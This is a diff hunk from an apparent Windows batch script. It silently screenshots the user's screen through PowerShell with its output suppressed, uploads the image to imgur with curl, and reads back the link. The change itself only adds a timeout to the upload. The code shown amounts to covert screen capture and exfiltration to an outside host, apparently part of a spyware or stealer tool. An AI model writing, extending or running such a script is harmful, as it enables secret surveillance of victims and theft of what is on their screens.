@@ -15,7 +15,7 @@ set username=%username:\=\\%
 for /f "delims=" %%i in ('powershell -Command "(Get-Date).ToUniversalTime().ToString('yyyy-MM-dd HH:mm:ss')"') do set time=%%i
 set screenshot_path=%temp_dir%\screenshot.png
 powershell -Command "Add-Type -AssemblyName System.Windows.Forms; $bitmap = New-Object Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $graphics = [Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Location, [System.Drawing.Point]::Empty, $bitmap.Size); $bitmap.Save('%screenshot_path%', [System.Drawing.Imaging.ImageFormat]::Png)" >nul 2>&1
-curl -X POST -H "Authorization: Client-ID %client_id%" -F "image=@%screenshot_path%" https://api.imgur.com/3/image.json > %temp_dir%\imgur_response.json
+curl -X POST -H "Authorization: Client-ID %client_id%" -F "image=@%screenshot_path%" https://api.imgur.com/3/image.json --max-time 5 > %temp_dir%\imgur_response.json
 for /f "delims=" %%i in ('powershell -Command "Get-Content %temp_dir%\imgur_response.json | ConvertFrom-Json | Select-Object -ExpandProperty data | Select-Object -ExpandProperty link"') do set image_url=%%i
 if "%image_url%"=="" exit /b
 (
